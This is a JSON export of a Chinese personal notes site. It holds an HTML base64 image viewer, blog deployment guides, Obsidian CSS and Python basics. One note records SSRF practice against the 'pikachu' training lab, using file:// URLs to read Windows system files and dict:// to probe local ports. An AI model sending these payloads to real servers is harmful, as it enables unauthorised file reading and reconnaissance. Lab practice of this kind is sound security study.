id=\"lbtn\"\u003e\u0026lt;\u003c/button\u003e\n              \u003cbutton id=\"rbtn\"\u003e\u0026gt;\u003c/button\u003e\n              \u003cp\u003e当前的位于：\u003cspan id=\"nowOn\"\u003e\u003c/span\u003e\u003c/p\u003e\n          \u003c/div\u003e\n          \u003cdiv\u003e\n              \u003chr\u003e\n              \u003cp\u003e上传转换成base64并下载\u003c/p\u003e\n              \u003cinput type=\"file\" name=\"files2\" multiple=\"multiple\" id=\"files2\" onchange=\"toBase64()\" /\u003e\n          \u003c/div\u003e\n      \n          \u003c!显示的图片 \u003e\n          \u003cdiv\u003e\n              \u003cimg id=\"imgg\" src=\"\" onclick=\"nextImg()\" width=\"100%\"\u003e\n          \u003c/div\u003e\n      \n      \u003c/body\u003e\n      \u003cscript\u003e\n          var filelength = 1;// 文件个数\n      \n          // var imgsrcFront=\"data:\" + \"image/png\" + \";base64,\";//src值：dataurl的前缀\n          var imgsrcFront = \"\";\n          var imgnum = 1;//信号量\n          // 获取左按钮节点\n          var lbtn = document.getElementById(\"lbtn\");\n          // 获取右边按钮节点\n          var rbtn = document.getElementById(\"rbtn\");\n          var imgg = document.getElementById(\"imgg\");//图片框的对象\n      \n          // 左边按钮\n          lbtn.onclick = function () {\n              imgnum;\n              if (imgnum \u003c 0) {\n                  imgnum = 0;\n              }\n              console.log(\"imgnum\" + imgnum)\n              var reader = new FileReader();\n              // 获取文件以及内容\n              var fileList = choosefile();\n              reader.readAsText(fileList[imgnum], \"UTF8\");\n              reader.onload = function (e) {\n                  content = e.target.result;\n                  imgg.src = imgsrcFront + content\n              }\n              nowOn(imgnum, choosefile().length);//显示当前的图片序号\n          }\n      \n          //获取已经加载的所有文件\n          function choosefile() {\n              filelength = document.getElementById('files').files.length; //将文件总数给全局变量\n              // console.log(\"总共个数：\" + filelength);\n              return document.getElementById('files').files;\n          }\n      \n          // 显示当前的图文序号\n          function nowOn(now, size) {\n              var a = document.getElementById(\"nowOn\");\n              a.innerText = (now + 1) + \"/\" + size;\n          }\n      \n          // 右边按钮时间\n          rbtn.onclick = function () {\n              nextImg();\n              // var fd = choosefile();\n              // // console.log(\"获取全部的\" + fd.length)\n              // imgnum++;\n              // if (imgnum \u003e= filelength) {\n              //     imgnum = 0;\n              // }\n              // console.log(\"imgnum\" + imgnum)\n              // var reader = new FileReader();\n              // // 获取文件以及内容\n              // var fileList = choosefile();\n              // reader.readAsText(fileList[imgnum], \"UTF8\");\n              // reader.onload = function (e) {\n              //     content = e.target.result;\n              //     imgg.src = imgsrcFront + content\n              // }\n              // nowOn(imgnum, choosefile().length);\n          }\n      \n          // 文件转成base64并下载\n          function toBase64() {\n              var fileList = document.getElementById('files2');\n              for (var i = 0; i \u003c fileList.files.length; i++) {\n                  const file = fileList.files[i];\n                  const reader = new FileReader();\n                  reader.onload = function (e) {\n                      const base64 = e.target.result;\n                      //   document.querySelector('#image').src = base64;\n                      var blob = new Blob([base64], { type: 'text/plain' });\n      \n                      // Create a link element and use the Blob URL as the download URL\n                      var a = document.createElement('a');\n                      // 采用原名称+随机数命名\n                      var aNum = Math.floor(Math.random(1, 100) * 100);\n                      console.log(aNum);\n                      // a.download =file.name.substring(0, file.name.lastIndexOf(\".\"))+\"\"+aNum+\".sm\" ;\n                      a.download = file.name + aNum + \".ccc\"\n                      a.href = window.URL.createObjectURL(blob);\n                      a.click();\n                  }\n                  reader.readAsDataURL(file);\n              }\n          }\n      \n          // 下一个图片\n          function nextImg() {\n              var fd = choosefile();\n              // console.log(\"获取全部的\" + fd.length)\n              imgnum++;\n              if (imgnum \u003e= filelength) {\n                  imgnum = 0;\n              }\n              console.log(\"imgnum\" + imgnum)\n              var reader = new FileReader();\n              // 获取文件以及内容\n              var fileList = choosefile();\n              reader.readAsText(fileList[imgnum], \"UTF8\");\n              reader.onload = function (e) {\n                  content = e.target.result;\n                  imgg.src = imgsrcFront + content\n              }\n              nowOn(imgnum, choosefile().length);\n          }\n      \u003c/script\u003e\n      \n      \u003c/html\u003e\n  ```\n## 其他扩展\n可以根据以上的思路进行加密、解密\n可以还原文件等等操作\n\n## 自用diy\n```html\n  \u003c!DOCTYPE html\u003e\n  \u003chtml lang=\"en\"\u003e\n  \n  \u003chead\u003e\n      \u003cmeta charset=\"UTF8\"\u003e\n      \u003cmeta httpequiv=\"XUACompatible\" content=\"IE=edge\"\u003e\n      \u003cmeta name=\"viewport\" content=\"width=devicewidth, initialscale=1.0\"\u003e\n      \u003ctitle\u003e图片base64转码查看\u003c/title\u003e\n  \u003c/head\u003e\n  \u003cstyle\u003e\n      * {\n          margin: 0;\n          padding: 0;\n      }\n  \n  \n  \n  \u003c/style\u003e\n  \n  \u003cbody\u003e\n      \u003cdiv\u003e\n          \u003cinput type=\"file\" name=\"file\" multiple=\"multiple\" id=\"files\" onchange=\"choosefile()\" /\u003e\n          \u003cbutton id=\"lbtn\"\u003e\u0026lt;\u003c/button\u003e\n          \u003cbutton id=\"rbtn\"\u003e\u0026gt;\u003c/button\u003e\n          \u003cp\u003e\u003cspan id=\"nowOn\" style=\"fontsize: 12px;\"\u003e\u003c/span\u003e\u003c/p\u003e\n      \u003c/div\u003e  \n      \u003cdiv\u003e\n          \u003chr\u003e\n          \u003cinput type=\"file\" name=\"files2\" multiple=\"multiple\" id=\"files2\" onchange=\"toBase64()\" value=\"fsd\" /\u003e\n          \u003cspan style=\"fontsize: 12px;\"\u003e上传图片\u003ebase64编码Dataurl并下载\u003c/span\u003e\n      \u003c/div\u003e\n  \n      \u003c!显示的图片 \u003e\n      \u003cdiv\u003e\n          \u003cimg id=\"imgg\" src=\"\" onclick=\"nextImg()\" width=\"100%\"\u003e\n      \u003c/div\u003e\n  \n      \u003cdiv\u003e\n          \u003cspan id=\"whatdown\"\u003e\u003c/span\u003e\n      \u003c/div\u003e\n  \n  \u003c/body\u003e\n  \u003cscript\u003e\n      var filelength = 1;// 文件个数\n  \n      // var imgsrcFront=\"data:\" + \"image/png\" + \";base64,\";//src值：dataurl的前缀\n      var imgsrcFront = \"\";\n      var imgnum = 1;//信号量\n      // 获取左按钮节点\n      var lbtn = document.getElementById(\"lbtn\");\n      // 获取右边按钮节点\n      var rbtn = document.getElementById(\"rbtn\");\n      var imgg = document.getElementById(\"imgg\");//图片框的对象\n  \n      // 左边按钮\n      lbtn.onclick = function () {\n          imgnum;\n          if (imgnum \u003c 0) {\n              imgnum = 0;\n          }\n          console.log(\"imgnum\" + imgnum)\n          var reader = new FileReader();\n          // 获取文件以及内容\n          var fileList = choosefile();\n          reader.readAsText(fileList[imgnum], \"UTF8\");\n          reader.onload = function (e) {\n              content = e.target.result;\n              imgg.src = imgsrcFront + content\n          }\n          nowOn(imgnum, choosefile().length);//显示当前的图片序号\n      }\n  \n      //获取已经加载的所有文件\n      function choosefile() {\n          filelength = document.getElementById('files').files.length; //将文件总数给全局变量\n          // console.log(\"总共个数：\" + filelength);\n          return document.getElementById('files').files;\n      }\n  \n      // 显示当前的图文序号\n      function nowOn(now, size) {\n          var a = document.getElementById(\"nowOn\");\n          a.innerText =\"文件名：\"+choosefile()[now].name+\n          \"\\t\\t序号：\"+ (now + 1) + \"/\" + size;\n      }\n  \n      // 右边按钮时间\n      rbtn.onclick = function () {\n          nextImg();\n          // var fd = choosefile();\n          // // console.log(\"获取全部的\" + fd.length)\n          // imgnum++;\n          // if (imgnum \u003e= filelength) {\n          //     imgnum = 0;\n          // }\n          // console.log(\"imgnum\" + imgnum)\n          // var reader = new FileReader();\n          // // 获取文件以及内容\n          // var fileList = choosefile();\n          // reader.readAsText(fileList[imgnum], \"UTF8\");\n          // reader.onload = function (e) {\n          //     content = e.target.result;\n          //     imgg.src = imgsrcFront + content\n          // }\n          // nowOn(imgnum, choosefile().length);\n      }\n  \n      // 文件转成base64并下载\n      function toBase64() {\n          var fileList = document.getElementById('files2');\n          var i ;\n          for ( i = 0; i \u003c fileList.files.length; i++) {\n              const file = fileList.files[i];\n              const reader = new FileReader();\n              distext((i+1)+\"\"+file.name+\"\u003cbr\u003e\");//显示转换的文件名称\n              reader.onload = function (e) {\n                  const base64 = e.target.result;\n                  //   document.querySelector('#image').src = base64;\n                  var blob = new Blob([base64], { type: 'text/plain' });\n                  \n                  // Create a link element and use the Blob URL as the download URL\n                  var a = document.createElement('a');\n                  // 采用原名称+随机数命名\n                  var aNum = Math.floor(Math.random(1, 100) * 100);\n                  console.log(aNum);\n                  // a.download =file.name.substring(0, file.name.lastIndexOf(\".\"))+\"\"+aNum+\".sm\" ;\n                  a.download = file.name + aNum + \".ccc\"\n                  a.href = window.URL.createObjectURL(blob);\n                  a.click();\n                  // distext(i+file.name+\"\u003cbr\u003e\");//显示转换的文件名称\n              }\n              reader.readAsDataURL(file);\n          }\n      }\n  \n      // 下一个图片\n      function nextImg() {\n          var fd = choosefile();\n          // console.log(\"获取全部的\" + fd.length)\n          imgnum++;\n          if (imgnum \u003e= filelength) {\n              imgnum = 0;\n          }\n          console.log(\"imgnum\" + imgnum)\n          var reader = new FileReader();\n          // 获取文件以及内容\n          var fileList = choosefile();\n          reader.readAsText(fileList[imgnum], \"UTF8\");\n          reader.onload = function (e) {\n              content = e.target.result;\n              imgg.src = imgsrcFront + content\n          }\n          nowOn(imgnum, choosefile().length);\n      }\n  \n      function distext(txt){\n              var sp1=document.getElementById(\"whatdown\");\n              sp1.innerHTML+=txt;\n      }\n  \u003c/script\u003e\n  \n  \u003c/html\u003e\n  ```","lastmodified":"2023-05-31T09:03:33.037907736Z","tags":null},"/logseq":{"title":"logseq","content":"\n与[[logseq]]相关的[[部署]]方案的url\n\t[pengx17/logseq-publish： 已存档。请检查 https://github.com/logseq/publish-spa](https://github.com/pengx17/logseq-publish)\nlogseq发布主页设置 `sidebar` 表示侧边栏的页面\n```\n  :default-home {:page \"overview\"\n\t\t\t\t :sidebar \"Contents\"  }\n  ```","lastmodified":"2023-05-31T09:03:33.037907736Z","tags":null},"/nextjs-notion-blog":{"title":"nextjs-notion-blog","content":"# nextjs-notion-blog\n\n\n\nCreated: September 5, 2022 4:52 PM\nTags: 全块适配, 响应快, 悬浮目录\n特点: 响应速度快，基本都能在3秒内更新。几乎全部block都可以正常显示。\n缺点是无评论区，过于宽的表格在手机上好像没有适配（不好横向翻）\n预览url: https://transitivebullsh.it/nextjs-notion-starter-kit\n\n# 预览\n\n![Untitled](../../assets/Untitled%2025.png)\n\n![Untitled](../../assets/Untitled%201%206.png)\n\n# 准备\n\n1. github项目位置\n    \n    [https://github.com/zhimiaoli/nextjs-notion-blog](https://github.com/zhimiaoli/nextjs-notion-blog)\n    \n2. 克隆的notion模板\n    \n    [Next.js Notion Starter Kit Template](https://notion.so/7875426197cf461698809def95960ebf)\n    \n3. 托管部署网站**vercel 这个静态网站托管非常好用，建议收藏**\n    \n    [Develop. Preview. Ship. For the best frontend teams - Vercel](https://vercel.com/)\n    \n\n# 步骤\n\n## 第一步：fork源码部分\n\n1. `fork` github的这个项目到自己的仓库\n2. 在自己`fork`过来的仓库中，修改site.config中`rootNotionPageId`参数，也就是你的分享页面地址\n    \n    ![https://www.notion.so/image/https%3A%2F%2Fs3.us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F91161462-27d6-4f4d-abda-cb0a35afe350%2FUntitled.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45EIPT3X45%252F20220905%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20220905T084032Z%26X-Amz-Expires%3D86400%26X-Amz-Signature%3Df32d828f3fe16e009fc5abf1a8fd4b046f86bdb4180aae9e0bc11c11b3d1bce0%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject?table=block\u0026id=08907eaa-ebad-434a-a568-bffad127bc01\u0026cache=v2](https://www.notion.so/image/https%3A%2F%2Fs3.us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F91161462-27d6-4f4d-abda-cb0a35afe350%2FUntitled.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45EIPT3X45%252F20220905%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20220905T084032Z%26X-Amz-Expires%3D86400%26X-Amz-Signature%3Df32d828f3fe16e009fc5abf1a8fd4b046f86bdb4180aae9e0bc11c11b3d1bce0%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject?table=block\u0026id=08907eaa-ebad-434a-a568-bffad127bc01\u0026cache=v2)\n    \n    其中8cdb46d4333e43c0b2a128ee95a23f7d就是你的页面ID地址\n    \n3. 修改**`rootNotionSpaceId`参数**\n    1. 浏览器打开notion，定位到博客首页（notion后台）的页面，打开chrome浏览器开发者工具（按浏览器页面F12），定位到网络，选择fetch标签。再访问另一个页面，随便找一个请求一般都能看到json中的`space_id`\n    的信息。\n    \n    ![Untitled](../../assets/Untitled%202%205.png)\n    \n4. 修改其他配置参数，一些提示语句、图片logo，**可忽略**。这个代码中有中文示例。一般是一些语录之类的。\n5. 点击代码下面的update进行更新\n\n## 第二步：vercel托管部分\n\n1. 注册vercel账号，建议使用github登录即可，方便使用github中fork过来的代码\n2. 新建一个project，然后选择你fork的项目\n\n![Untitled](../../assets/Untitled%203%205.png)\n\n1. 点击下面的`deploy`进行部署\n\n## 第三步：等待\n\n等三分钟就好了，直接点击visit，就可以访问了\n\n![我亲手尝试的](../../assets/Untitled%204%205.png)\n\n我亲手尝试的\n\n![Untitled](../../assets/Untitled%205%204.png)\n\n# about\n\n项目开发者教程\n\n\u003e 如果你有了解源码的兴趣，可以点击下面这个开发者demo网站，上面fork的github源码仓库是二次编辑过的。\n\u003e \n\n[Next.js Notion Starter Kit](https://transitivebullsh.it/nextjs-notion-starter-kit)","lastmodified":"2023-05-31T09:03:33.037907736Z","tags":null},"/obsidian":{"title":"obsidian","content":"- 语法：[Markdown超级教程 Obsidian版 - 秃秃的小屋 - Obsidian Publish](https://publish.obsidian.md/csj-obsidian/0+-+Obsidian/Markdown/Markdown%E8%B6%85%E7%BA%A7%E6%95%99%E7%A8%8B+Obsidian%E7%89%88)\n\t- [MarkDown语法 超详细教程 - 经验分享 - Obsidian 中文论坛](https://forum-zh.obsidian.md/t/topic/435)\n- 帮助文档\n\t- [Callouts - Obsidian Help](https://help.obsidian.md/Editing+and+formatting/Callouts)\n- 配置\n\t- [[001_部署Obsidian静态知识库网站]]\n\t- [[002_知识库更新日志]]\n\t- [[Obsidian知识库笔记相关注意事项]]\n\t- [[004_Yaml字段配置]]\n\t- [[005_看板目录的使用]]\n\t- [[006_搭建书架教程]]\n\t- [[007_obsidian相关]]\n\t- [[009_关于命名规范的标识符]]\n- 美化\n\t- [[obsidian侧边背景]]\n\t- [[obsidian背景图片]]\n- 样式文档\n\t- 咖啡豆文档\n\t\t- [CSS代码片段 | obsidian文档咖啡豆版 (coffeetea.top)](https://coffeetea.top/zh/css-snippets/)\n\nabout::[[博客]]","lastmodified":"2023-05-31T09:03:33.037907736Z","tags":null},"/obsidian%E4%BE%A7%E8%BE%B9%E8%83%8C%E6%99%AF":{"title":"obsidian侧边背景","content":"```css\n/* Draw background image and add a separator from the header. */\n\n.nav-files-container {\n\n  background-image: url(\"https://images.unsplash.com/photo-1684402742742-e10e16c64642?ixlib=rb-4.0.3\u0026ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D\u0026auto=format\u0026fit=crop\u0026w=1170\u0026q=80\"); /* Replace me with the image you like. */\n\n  background-size: cover;\n\n  background-position: 0%;\n\n  border-top: 0px solid var(--background-modifier-border);\n\n  z-index: 1;\n\n}\n\n  \n\n/* Draw a solid overlay on top of image. */\n\n.nav-files-container:before {\n\n  content: \"\";\n\n  background-color: var(--background-secondary);\n\n  opacity: 0.9;\n\n  height: 0%;\n\n  width: 0%;\n\n  position: fixed;\n\n  z-index: 2;\n\n  display: block;\n\n}\n\n  \n\n/* Target the top-level folder-title to add more negative space from header. */\n\n.nav-folder-title[data-path=\"/\"] {\n\n  padding-top: 1em;\n\n}\n\n  \n\n/* Extra separation from the background for the text. A subtle text shadow. */\n\n.nav-folder-title-content, .nav-file-title-content {\n\n  text-shadow: 1px 1px 2px rgba(255, 255, 255, 0.2);\n\n}\n\n  \n\n.theme-dark .nav-folder-title-content, .theme-dark .nav-file-title-content {\n\n  text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.5);\n\n}\n\n  \n\n/* Tell the child nav-folder to be on top of image and overlay */\n\n.nav-folder {\n\n  position: relative;\n\n  z-index: 3;\n\n}\n\n  \n\n/* Make the active selection background and hover frosted glass for more fun. */\n\n.nav-file-title.is-active, .nav-folder-title.is-active, body:not(.is-grabbing) .nav-file-title:hover, body:not(.is-grabbing) .nav-folder-title:hover {\n\n  background: rgba(var(--text-muted-rgb), 0.1);\n\n  box-shadow: inset 1px 1px 0 0 rgba(var(--text-muted-rgb), 0.055);\n\n  backdrop-filter: blur( 4px );\n\n  border-radius: 3px 0 0 3px;\n\n}\n```","lastmodified":"2023-05-31T09:03:33.037907736Z","tags":null},"/obsidian%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87":{"title":"obsidian背景图片","content":"# 全局背景样式修改\n```css\n.theme-light .workspace {\n  backdrop-filter: brightness(1) blur(5px);\n  background-color: transparent;\n}\n.horizontal-main-container {\n  background: url(https://w.wallhaven.cc/full/qd/wallhaven-qdlo7r.jpg);\n  background-size: cover;\n}\n.workspace-split.mod-root {\n  background-color: var(--background-primary);\n}\n\nbody { \n  --background-primary: transparent;\n  --background-secondary: transparent;\n  --divider-width: 0px;\n}\n```","lastmodified":"2023-05-31T09:03:33.037907736Z","tags":null},"/outline":{"title":"outline","content":"- [[网络安全]]\n- [[稻谷]]\n- [[obsidian]]\n- [[Java]]\n- [[Git]]\n- [[心有所感]]\n- [[收集箱]]\n- [[网安]]\n- [[python]]\n","lastmodified":"2023-05-31T09:03:33.037907736Z","tags":null},"/outline-dataview":{"title":"outline-dataview","content":"```dataview\ntable title\nfrom \"pages\"\nwhere title=null\n```","lastmodified":"2023-05-31T09:03:33.037907736Z","tags":null},"/pikachu":{"title":"pikachu","content":"\n- ## ssrf漏洞部分（两个关卡同理）\n- 使用ssrf漏洞的相关协议，传输到url参数中去即可\n\t- ```\n\t  http://pikachu:8065/vul/ssrf/ssrf_curl.php?url=file://c:/windows/system.ini\n\t  ```\n\t- ![image.png](../../assets/image_1681796483715_0.png)\n- 使用dict协议查看一下端口是否开放：如果返回信息，说明有开放\n\t- http://pikachu:8065/vul/ssrf/ssrf_curl.php?url=dict://127.0.0.1:3306\n\t- ![image.png](../../assets/image_1681796598028_0.png){:height 247, :width 746}\n- 使用外部实体协议，读取php文件\n\t- ((643d2e1c-beb3-4e6b-95e3-b1bf66e3d461))\n\t-\n- ### [[问题]]\n- 由于没有php版本中没有配置curl扩展，所以导致无法请求三方url\n- [[解决]] ::\n\t- 随便选择一个  ![image.png](../../assets/image_1681796354646_0.png)\n\t- 打开php.ini配置文件，插入语句，添加php curl扩展，注意前面没有分号;否则无法生效\n\t\t- ```\n\t\t  extension=php_curl.dll\n\t\t  ```","lastmodified":"2023-05-31T09:03:33.037907736Z","tags":null},"/python":{"title":"python","content":"- [[python.01 变量]]\n- [[python.02 数据类型]]\n- [[python.03 接收输入input函数]]\n- [[python.04 程序结构]]\n- [[python.05 内置函数]]\n- [[python.06 列表list]]\n- [[python.07 字典]]\n- [[python.07a 元组]]\n- [[python.08 字符串]]\n- [[python.09 函数]]\n- [[python.10 bug]]\n- [[python.11 类与对象]]\n- [[python.12 对象的具体使用]]\n- [[python.13 模块的使用]]\n- [[python.15 学生管理系统]]\n- [[python总结]]","lastmodified":"2023-05-31T09:03:33.041907772Z","tags":null},"/python%E6%80%BB%E7%BB%93":{"title":"python总结","content":"\n- #总结 python\n- \u003e 总共17个章节，上面的笔记中总结了16个半章节的内容\n  剩下的部分没有必要继续学习了，因为后面的案例项目逻辑简单，基本都是单文件的使用，没有模块之间的相互调用。\n- \u003e 这种小案例在学习java的时候已经学习过了更深层次的，其次语法部分难点不多，但是隔一天仍然需要去复习一下。\n\n[[python.01 变量]]\n[[python.02 数据类型]]\n[[python.03 接收输入input函数]]\n[[python.04 程序结构]]\n[[python.05 内置函数]]\n[[python.06 列表list]]\n[[python.07 字典]]\n[[python.07a 元组]]\n[[python.08 字符串]]\n[[python.09 函数]]\n[[python.10 bug]]\n[[python.11 类与对象]]\n[[python.12 对象的具体使用]]\n[[python.13 模块的使用]]\n[[python.14 文件]]\n[[python.15 学生管理系统]]\n","lastmodified":"2023-05-31T09:03:33.041907772Z","tags":null},"/python.01-%E5%8F%98%E9%87%8F":{"title":"python.01 变量","content":"## 变量赋值\n\n直接用`变量名=变量值`即可，不需要定义类型，弱类型语法。\n\n```python\nname='玛利亚'\nprint(name)\nprint('标识',id(name))\nprint('类型',type(name))\nprint('值',name)\n```\n\n任意对象一般都包括以上这几个方法，其中`id()`可以判断是否是一个对象。\n\n其中id指的是字符串常量的内存地址id，也就是说如果有别的变量字符串也是这样，那么所指向的id也是一样的。有点类似于java中的字符常量池。\n- 两个不同变量的字符串一样，那么指向的id值一样\n  \n    ```python\n    name='玛利亚'\n    print(name)\n    print('标识',id(name))\n    print('类型',type(name))\n    print('值',name)\n    \n    name2='玛利亚'\n    print(name2)\n    print('标识',id(name2))\n    print('类型',type(name2))\n    print('值',name2)\n    ```\n    \n    ![img](https://tc3.doingnothing.online/assets/202303042237489.png)\n## 四种赋值方式\n\n1. 直接赋值 a=12\n2. 链式赋值 a=b=c=12\n3. 参数赋值 +=，*=、-=等等\n4. **系列解包赋值 `a,b,c=12,3,34`**   等同于a=12,b=3,c=34  (**经常用在两个变量交换的时候**a,b=d,c)","lastmodified":"2023-05-31T09:03:33.037907736Z","tags":null},"/python.02-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B":{"title":"python.02 数据类型","content":"- #python\n- 基本数据类型主要有以下四种\n    1. 正数\n    2. 浮点数\n    3. 布尔\n\t- `1真0假`  值开头是大写 `True`，`False`\n\t- 所有对象都有布尔值，可以使用`bool()`函数获取对象的布尔值\n\t- 空对象的布尔值一般都是`False` ，比如空数组，空集合\n\t      4. 字符串：单引号、双引号、三引号（内容可以多行）\n## 加减法：浮点数类型的精度问题\n\n在进行浮点数的运算时，最好导入`Decimal` ，避免精度问题，尤其是末尾是3的一些数值的运算的时候，会因为计算机底层二进制的缘故，导致出错。\n\n```python\nfrom decimal import Decimal\n```\n- eg\n  \n    ```python\n    from decimal import Decimal\n    print(1.1+2.2)\n    print(Decimal('1.1')+Decimal('2.2'))\n    ```\n    \n    ![img](https://tc3.doingnothing.online/assets/202303042238231.png)","lastmodified":"2023-05-31T09:03:33.037907736Z","tags":null},"/python.03-%E6%8E%A5%E6%94%B6%E8%BE%93%E5%85%A5input%E5%87%BD%E6%95%B0":{"title":"python.03 接收输入input函数","content":"\n- #python input函数主要用于接受键盘输入。\n  \n  需要注意的，接收的值是`字符串类型` ，**如果需要进行数值运算，需要对每个数字使用`evel() 函数转换成数值`** 使用int()等强制转换也是可以的\n- eg\n  \n  ```\n  a=input(\"请输入一个数\")\n  b=input(\"请输入一个数\")\n  print(a+b)\n  print(eval(a+b))\n  print(eval(a)+eval(b))\n  ```\n  \n  ![](https://tc3.doingnothing.online/assets/202303042238470.png)","lastmodified":"2023-05-31T09:03:33.037907736Z","tags":null},"/python.04-%E7%A8%8B%E5%BA%8F%E7%BB%93%E6%9E%84":{"title":"python.04 程序结构","content":"- #python\n- 选择（switch）、循环（for，while）、判断（if）\n## 条件表达式\n\n类似于三目运算符\n\n如果满足中间的条件，就执行前面的，不满足就执行后面的\n\n![img](https://tc3.doingnothing.online/assets/202303042238047.png)\n\n如果2\u003e3就输出结果2，否则就输出3\n\n```python\nprint(2 if 2\u003e3 else 3)\n```\n\n输出结果：3\n### pass语句\n\n主要用于**语句占位**，**避免程序报错**，比如在一些不需要进行处理的地方，就可以使用pass占位。\n- 不使用pass报错情况例子\n  \n    ![if语句中，没有对判断结果True进行处理，所以需要pass进行占位](https://tc3.doingnothing.online/assets/202303042238551.png){:height 751, :width 626}\n    \n    if语句中，没有对判断结果True进行处理，所以需要pass进行占位\n- paa语句 eg\n  \n    ```python\n    str=input(\"你是人吗？y/n\")\n    if str==\"y\":\n        pass\n    else:\n        print(\"你不是\")\n    ```","lastmodified":"2023-05-31T09:03:33.037907736Z","tags":null},"/python.05-%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0":{"title":"python.05 内置函数","content":"\n- #python\n## range()\n\n用于**生成整数序列**\n\n#+BEGIN_EXPORT hiccup\n[:aside {} \"📌 优点是：相比数组，序列不论里面的具体元素有多少个，\"]\n#+END_EXPORT\n\n**占用的空间都是一样的**，都只是三个参数——start、end、step步长。只有具体使用到序列中的对象才会进行计算\n\n\u003c/aside\u003e\n- 创建以及常用方法in、not in判断是否含有\n  \n  ```\n  # 创建序列的三种方式\n  r=range(10) #0到10\n  rr=range(15,20) #1到100\n  rrr=range(1,50,3) #从1开始依次加3，直到小于等于一百的数\n  # 输出序列\n  print(list(r))\n  print(list(rr))\n  print(list(rrr))\n  # 判断是否含有\n  print(2 in r)\n  print(2 in rr)\n  print(2 in rrr)\n  ```","lastmodified":"2023-05-31T09:03:33.037907736Z","tags":null},"/python.06-%E5%88%97%E8%A1%A8list":{"title":"python.06 列表list","content":"\n\n列表存储的不是对象本身，而是指向对象的引用。\n列表的特点\n元素有序排列\n索引映射指向唯一一个数据\n可以存储重复的数据\n元素可以是任意类型\n根据需要动态分配和回收内存\n## 创建列表\n\n```\n# 创建列表\na=[\"a\",\"b\",10]\n#调用\nprint(id(a))\nprint(a[0],id(a[0]),type(a[0]))\nprint(a[1],id(a[1]),type(a[1]))\nprint(a[2],id(a[2]),type(a[2]))\n```\n输出结果\n  \n```\n  1435379097728\n  a 1435379127472 \u003cclass 'str'\u003e\n  b 1435378911472 \u003cclass 'str'\u003e\n  10 1435377730064 \u003cclass 'int'\u003e\n```\n## 常列表用函数\n`index(string,[start],[end])`：查找第一个找到的元素的位置 ，参数：元素、查找起始位置的下标、末尾。找不到会`ValueError` 报错。\n  \n```\n  a=[\"a\",\"bb\",\"a\",\"b\",10]\n  print(a.index(\"a\"))\n  print(a.index(\"a\",1)) #从下标为1的开始查找\n  print(a.index(\"a\",1,-1)) #从下标1到最后一个中间找\n```\n  \n```\n  返回输出结果\n  \n    ```python\n    0\n    2\n    2\n    ```\n  \n  2. `[start:end:step]`切片：从列表中获取一个片段的列表，拷贝成一个新的列表对象。id值和原来的不一样。**切片会产生一个新的列表对象**\n  \n      切片的start和end中，不会包含较小值索引那个值，如下面[1:5:2]例子所示\n  \n      ```python\n      a=[1,2,3,4,5,6,7]\n# 切片\n    print(a[1:5:2])\n# 步长为负数\n    print(a[5:1:-1])\n    #省略参数\n    print(a[:4:2])\n    ```\n输出结果\n\n  ```python\n  [2, 4]\n  [6, 5, 4, 3]\n  [1, 3]\n```\n\n3. `in`,`not in`是否含有元素\n\n```python\n    a=[1,2,3,4,5,6,7]\n    print( 3 in a)\n    print( 54 in a)\n```\n结果\n\n```python\n  True\n  False\n```\n\n4. 遍历列表`for in`\n\n```python\n    a=[1,2,3,4,5,6,7]\n    for num in a:\n  print(num)\n```\n结果\n\n```python\n  1\n  2\n  3\n  4\n  5\n  6\n  7\n```\n\n## 列表添加元素\n\n添加元素，不会改变原来列表对象的id，还是原来的对象\n`append()` ：添加一个，可以将另一个列表作为一个对象添加进来。\n`extend()` ：添加一个元素，或者将另一个列表中的多个对象添加进来\n`insert()` ：指定位置添加\n切片添加：覆盖添加\n  \n```\n  a=[1,2,3,4,5,6,7]\n  b=[\"a\",\"b\",\"c\",\"d\",\"e\"]\n  # append\n  a.append(\"你好\")\n  print(a)\n  a.append(b)\n  print(a)\n  \n  # extend\n  a=[1,2,3,4,5,6,7]\n  b=[\"a\",\"b\",\"c\",\"d\",\"e\"]\n  a.extend(\"个\")\n  print(a)\n  a.extend(b)\n  print(a)\n  \n  # insert\n  a=[1,2,3,4,5,6,7]\n  b=[\"a\",\"b\",\"c\",\"d\",\"e\"]\n  a.insert(3,b)\n  a.insert(4,\"insert\")\n  print(a)\n  \n  # 切片添加\n  a=[1,2,3,4,5,6,7]\n  b=[\"a\",\"b\",\"c\",\"d\",\"e\"]\n  a[1::]=b\n  print(a)\n  ```\n输出结果\n  \n  ```\n  [1, 2, 3, 4, 5, 6, 7, '你好']\n  [1, 2, 3, 4, 5, 6, 7, '你好', ['a', 'b', 'c', 'd', 'e']]\n  \n  [1, 2, 3, 4, 5, 6, 7, '个']\n  [1, 2, 3, 4, 5, 6, 7, '个', 'a', 'b', 'c', 'd', 'e']\n  \n  [1, 2, 3, ['a', 'b', 'c', 'd', 'e'], 'insert', 4, 5, 6, 7]\n  \n  [1, 'a', 'b', 'c', 'd', 'e']\n  ```\n## 列表元素的删除\n`remove()` : 删除对应元素\n`pop()` 删除指定索引上的对象\n切片 一次至少删除一个，实际是返回了一个新的列表对象\n`clear()` :: 清空列表\n`del()` :删除列表\n  \n  ```\n  a=[1,2,3,4,5,6,7]\n  #remove\n  a.remove(3)\n  print(a)\n  #pop\n  a.pop(3)\n  print(a)\n  #切片\n  b=a[1:3]\n  print(b)\n  #clear()\n  b.clear()\n  print(b)\n  #del\n  del(b)\n  print(b)\n  ```\n结果\n  \n  ```\n  [1, 2, 4, 5, 6, 7]\n  [1, 2, 4, 6, 7]\n  [1, 6, 7]    fsl\n  [2, 4]\n  []\n  